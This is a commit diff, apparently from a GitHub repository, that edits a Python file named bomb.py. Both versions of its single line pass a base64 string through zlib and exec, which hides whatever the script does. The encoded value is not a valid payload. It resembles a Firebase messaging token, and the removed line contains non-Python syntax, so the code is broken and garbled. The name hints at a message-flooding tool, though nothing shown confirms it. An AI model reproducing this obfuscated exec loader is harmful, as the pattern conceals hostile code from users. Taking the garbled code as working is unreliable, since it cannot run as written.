70d1900f1540798d8ac0dcce19981b42d439ec9f
amir89gunstor <95468506+amir89gunstor@users.noreply.github.com>
2022-01-12 15:03:17 +0330

    Update bomb.py

--- bomb.py
+++ bomb.py
@@ -1,4 +1,4 @@
 import marshal,zlib,base64
-exec(zlib.decompress(base64.b64decode("b09df731ffd613a5","firebaseId"=>"fdPz8h8oo5g:APA91bEmK9-EUXt-FsQ1CGIIVBZkAjm4Cd25Si86dxzHuRxcUASTh8hUlvkhFmwoWW2eY9rwAC2Jm6xqXOcKQDuz_0v8TRsdwiBQqyeI516Tt3cshCNi24KVIYqRgAxueQ7youcrHAAi")))
+exec(zlib.decompress(base64.b64decode("fdPz8h8oo5g:APA91bEmK9-EUXt-FsQ1CGIIVBZkAjm4Cd25Si86dxzHuRxcUASTh8hUlvkhFmwoWW2eY9rwAC2Jm6xqXOcKQDuz_0v8TRsdwiBQqyeI516Tt3cshCNi24KVIYqRgAxueQ7youcrHAAi")))
 
 
